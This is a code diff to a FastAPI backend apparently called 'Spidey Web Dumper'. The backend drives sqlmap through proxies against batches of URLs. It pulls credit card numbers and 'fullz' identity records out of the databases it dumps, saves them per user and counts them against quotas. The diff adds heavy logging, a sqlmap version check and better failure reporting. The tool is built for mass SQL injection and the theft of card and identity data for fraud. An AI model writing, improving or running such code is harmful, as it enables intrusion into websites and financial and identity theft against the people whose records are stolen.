@@ -1,6 +1,6 @@
 """
-Spidey Web Dumper — FastAPI Backend (FINAL v7.0)
-Latest SQLmap + All Processes Fixed + alldumps Real Data Check
+Spidey Web Dumper — FastAPI Backend (FINAL v8.0)
+Heavy Logging • SQLmap Version Check • All Fixes
 """
 import os
 import io
@@ -15,6 +15,7 @@ import tempfile
 import shutil
 import zipfile
 import hashlib
+import subprocess
 from collections import defaultdict
 from datetime import datetime, timedelta
 from pathlib import Path
@@ -1287,16 +1288,25 @@ async def api_dump_run(request: Request, urls: str = Form(...), level: int = For
 
 async def _run_dump(tid, uid, urls, level, risk, threads, technique, tamper, crawl):
     try:
-        logger.info(f"[dump:{tid}] STARTED")
+        logger.info("=" * 70)
+        logger.info(f"[dump:{tid}] STARTED — {len(urls)} URLs")
+        logger.info(f"[dump:{tid}] Level={level} Risk={risk} Threads={threads}")
+        logger.info(f"[dump:{tid}] Technique={technique} Tamper={tamper}")
+        logger.info("=" * 70)
+        
         update_task(tid, status="running")
         update_progress(tid, total=len(urls), msg="Starting sqlmap...")
         proxies = get_user_proxies(uid)
+        logger.info(f"[dump:{tid}] Proxies available: {len(proxies)}")
+        
         from core.sqlmap_api import api_dump_multiple
         from core.fullz import extract_fullz_from_dir, fullz_records_to_lines
+        
         all_cards = set()
         all_fullz = []
         all_raw_dumps = []
         last_edit = [time.time()]
+        url_count = [0]
 
         async def on_prog(done, total, success):
             if is_cancelled(tid):
@@ -1305,6 +1315,7 @@ async def _run_dump(tid, uid, urls, level, risk, threads, technique, tamper, cra
             if now - last_edit[0] < 1.0:
                 return
             last_edit[0] = now
+            logger.info(f"[dump:{tid}] PROGRESS: {done}/{total} | Success: {success}")
             update_progress(
                 tid, done=done, total=total,
                 cards=len(all_cards), fullz=len(all_fullz),
@@ -1312,28 +1323,49 @@ async def _run_dump(tid, uid, urls, level, risk, threads, technique, tamper, cra
             )
 
         async def on_result(r, zip_bytes):
+            url_count[0] += 1
+            logger.info("-" * 70)
+            logger.info(f"[dump:{tid}] URL #{url_count[0]}: {getattr(r, 'url', 'unknown')}")
+            logger.info(f"[dump:{tid}]   taskid: {getattr(r, 'taskid', '')}")
+            logger.info(f"[dump:{tid}]   success: {getattr(r, 'success', False)}")
+            logger.info(f"[dump:{tid}]   error: {getattr(r, 'error', 'none')}")
+            logger.info(f"[dump:{tid}]   log_lines: {len(getattr(r, 'log_lines', []) or [])}")
+            logger.info(f"[dump:{tid}]   tables: {len(getattr(r, 'tables', []) or [])}")
+            logger.info(f"[dump:{tid}]   data_rows: {len(getattr(r, 'data_rows', []) or [])}")
+            logger.info(f"[dump:{tid}]   csv_files: {len(getattr(r, 'csv_files', []) or [])}")
+            logger.info(f"[dump:{tid}]   csv_dir: {getattr(r, 'csv_dir', '')}")
+            logger.info(f"[dump:{tid}]   cards: {len(getattr(r, 'cards', []) or [])}")
+            
+            log_lines = getattr(r, 'log_lines', []) or []
+            for i, line in enumerate(log_lines[:5]):
+                logger.info(f"[dump:{tid}]   log[{i}]: {line[:150]}")
+            
             if getattr(r, "cards", None):
                 for c in r.cards:
                     all_cards.add(c)
+            
             try:
                 src = getattr(r, "csv_dir", "") or ""
                 if src and os.path.isdir(src):
                     recs = extract_fullz_from_dir(src)
                     if recs:
                         all_fullz.extend(recs)
-            except Exception:
-                pass
+                        logger.info(f"[dump:{tid}]   Extracted {len(recs)} fullz")
+            except Exception as e:
+                logger.error(f"[dump:{tid}] Fullz extract error: {e}")
+            
             try:
                 dump_text = _capture_raw_dump(r)
                 if dump_text:
                     all_raw_dumps.append(dump_text)
                     n_lines = len(dump_text.splitlines())
+                    logger.info(f"[dump:{tid}]   Raw dump: {n_lines} lines")
                     if "Real Data: True" in dump_text:
                         add_log(tid, f"✅ {r.url[:50]} | {n_lines} lines")
                     else:
                         add_log(tid, f"⚠️ {r.url[:50]} | NOT VULNERABLE")
-            except Exception:
-                pass
+            except Exception as e:
+                logger.exception(f"[dump:{tid}] Raw capture error: {e}")
 
         try:
             await api_dump_multiple(
@@ -1343,11 +1375,19 @@ async def _run_dump(tid, uid, urls, level, risk, threads, technique, tamper, cra
                 task_id=tid, max_concurrent=8,
             )
         except TypeError:
+            logger.warning(f"[dump:{tid}] Old signature — fallback")
             await api_dump_multiple(
                 urls, proxy_list=proxies, level=level, risk=risk,
                 technique=technique, threads=threads, tamper=tamper,
                 crawl_depth=crawl, progress_cb=on_prog, per_result_cb=on_result,
             )
+
+        logger.info("=" * 70)
+        logger.info(f"[dump:{tid}] ALL URLs DONE")
+        logger.info(f"[dump:{tid}] Total cards: {len(all_cards)}")
+        logger.info(f"[dump:{tid}] Total fullz: {len(all_fullz)}")
+        logger.info(f"[dump:{tid}] Total raw dumps: {len(all_raw_dumps)}")
+        logger.info("=" * 70)
 
         all_cards = list(all_cards)
         ts = datetime.now().strftime("%d%m%y_%H%M%S")
@@ -1358,6 +1398,7 @@ async def _run_dump(tid, uid, urls, level, risk, threads, technique, tamper, cra
             result["cards_file"] = cc_name
             result["cards"] = len(all_cards)
             consume_quota(uid, "cards", len(all_cards))
+            logger.info(f"[dump:{tid}] Saved CC: {cc_name}")
 
         if all_fullz:
             seen = set()
@@ -1375,6 +1416,7 @@ async def _run_dump(tid, uid, urls, level, risk, threads, technique, tamper, cra
                 result["fullz_file"] = fz_name
                 result["fullz"] = len(rich)
                 consume_quota(uid, "fullz", len(rich))
+                logger.info(f"[dump:{tid}] Saved Fullz: {fz_name}")
 
         if all_raw_dumps:
             content = "\n".join(all_raw_dumps)
@@ -1382,10 +1424,12 @@ async def _run_dump(tid, uid, urls, level, risk, threads, technique, tamper, cra
             al_name = save_output(uid, f"alldumps_{n_lines}_{ts}.txt", content)
             result["alldump_file"] = al_name
             result["alldump_lines"] = n_lines
+            logger.info(f"[dump:{tid}] Saved alldumps: {al_name} ({n_lines} lines)")
         else:
-            al_name = save_output(uid, f"alldumps_0_{ts}.txt", "# No data")
+            al_name = save_output(uid, f"alldumps_0_{ts}.txt", "# No data — all URLs failed")
             result["alldump_file"] = al_name
             result["alldump_lines"] = 0
+            logger.warning(f"[dump:{tid}] No raw dumps")
 
         consume_quota(uid, "dumps", len(urls))
         save_last_response(uid, "dump", {
@@ -1403,17 +1447,19 @@ async def _run_dump(tid, uid, urls, level, risk, threads, technique, tamper, cra
                         fullz=result.get("fullz", 0),
                         msg=f"✅ CC:{result.get('cards',0)} Fullz:{result.get('fullz',0)}")
         add_log(tid, f"✅ Done — CC:{result.get('cards',0)} Fullz:{result.get('fullz',0)} Raw:{result.get('alldump_lines',0)}")
+        logger.info(f"[dump:{tid}] ✅ DONE")
     except asyncio.CancelledError:
         add_log(tid, "⛔ Cancelled")
         update_progress(tid, msg="⛔ Cancelled")
+        logger.info(f"[dump:{tid}] CANCELLED")
     except Exception as e:
-        logger.exception(f"[dump:{tid}] ERROR")
+        logger.exception(f"[dump:{tid}] ❌ CRITICAL ERROR")
         update_task(tid, status="error", error=str(e))
         add_log(tid, f"❌ Error: {str(e)[:200]}")
 
 
 def _capture_raw_dump(result) -> str:
-    """Capture only REAL data from sqlmap result"""
+    """Capture RAW data from sqlmap result — with heavy logging"""
     lines = []
     url = getattr(result, "url", "unknown")
     
@@ -1431,6 +1477,8 @@ def _capture_raw_dump(result) -> str:
         "available databases",
         "current user is",
         "current database is",
+        "table:",
+        "database:",
     ]
     
     error_indicators = [
@@ -1440,6 +1488,10 @@ def _capture_raw_dump(result) -> str:
         "no parameter(s) found",
         "all tested parameters do not appear",
         "connection timed out",
+        "unable to connect",
+        "connection refused",
+        "connection reset",
+        "no usable",
     ]
     
     for ind in success_indicators:
@@ -1447,26 +1499,37 @@ def _capture_raw_dump(result) -> str:
             has_real_data = True
             break
     
-    lines.append("# " + "=" * 68)
+    lines.append("# " + "=" * 70)
     lines.append(f"# URL: {url}")
     lines.append(f"# Task: {getattr(result, 'taskid', '')}")
+    lines.append(f"# Success: {getattr(result, 'success', False)}")
     lines.append(f"# Real Data: {has_real_data}")
     lines.append(f"# DBMS: {getattr(result, 'dbms', '') or getattr(result, 'banner', '')}")
     lines.append(f"# User: {getattr(result, 'current_user', '')}")
     lines.append(f"# Database: {getattr(result, 'current_db', '')}")
-    lines.append("# " + "=" * 68)
+    lines.append(f"# Error: {getattr(result, 'error', '')}")
+    lines.append("# " + "=" * 70)
     lines.append("")
     
     if not has_real_data:
         lines.append("# ❌ NO REAL DATA — URL not vulnerable or errors")
         lines.append("")
-        lines.append("### Why? Check SQLmap log below:")
+        lines.append("### Error indicators found in log:")
+        found_errs = []
         for line in log_text.splitlines():
             ll = line.lower()
             for err in error_indicators:
-                if err in ll:
-                    lines.append(f"  - {line}")
+                if err in ll and line not in found_errs:
+                    found_errs.append(line)
                     break
+        for e in found_errs[:10]:
+            lines.append(f"  - {e}")
+        if not found_errs:
+            lines.append("  (no specific error indicators found)")
+        lines.append("")
+        lines.append("### Last 30 lines of sqlmap log:")
+        for line in log_text.splitlines()[-30:]:
+            lines.append(f"  {line}")
         lines.append("")
         return "\n".join(lines)
     
@@ -1768,15 +1831,44 @@ async def admin_stats(request: Request):
 # ═══════════════════════════════════════════════════════════════════════════
 @app.on_event("startup")
 async def on_startup():
-    logger.info("🕷️  Spidey starting...")
+    logger.info("=" * 70)
+    logger.info("🕷️  SPIDEY WEB DUMPER STARTING")
+    logger.info("=" * 70)
+    
     load_users()
     load_keys()
     load_tasks_from_disk()
+    
+    # ✅ CHECK SQLMAP VERSION
+    try:
+        logger.info("[sqlmap] Checking version...")
+        result = subprocess.run(
+            ["sqlmap", "--version"],
+            capture_output=True, text=True, timeout=15
+        )
+        version_out = (result.stdout or "").strip()
+        version_err = (result.stderr or "").strip()
+        logger.info(f"[sqlmap] STDOUT: {version_out[:300]}")
+        if version_err:
+            logger.info(f"[sqlmap] STDERR: {version_err[:300]}")
+        
+        result2 = subprocess.run(
+            ["sqlmapapi", "--version"],
+            capture_output=True, text=True, timeout=15
+        )
+        logger.info(f"[sqlmapapi] STDOUT: {(result2.stdout or '').strip()[:200]}")
+    except FileNotFoundError as e:
+        logger.error(f"[sqlmap] ❌ BINARY NOT FOUND: {e}")
+    except Exception as e:
+        logger.error(f"[sqlmap] ❌ Version check failed: {e}")
+    
+    # ✅ Start sqlmapapi
     try:
         from core.sqlmap_api import ensure_api_server
         asyncio.create_task(ensure_api_server())
+        logger.info("[sqlmapapi] Starting in background...")
     except Exception as e:
-        logger.warning(f"sqlmapapi start failed: {e}")
+        logger.warning(f"[sqlmapapi] Start failed: {e}")
 
     async def _cleaner():
         while True:
@@ -1786,7 +1878,10 @@ async def on_startup():
             except Exception:
                 pass
     asyncio.create_task(_cleaner())
-    logger.info("✅ Spidey ready")
+    
+    logger.info("=" * 70)
+    logger.info("✅ SPIDEY READY")
+    logger.info("=" * 70)
 
 
 @app.on_event("shutdown")
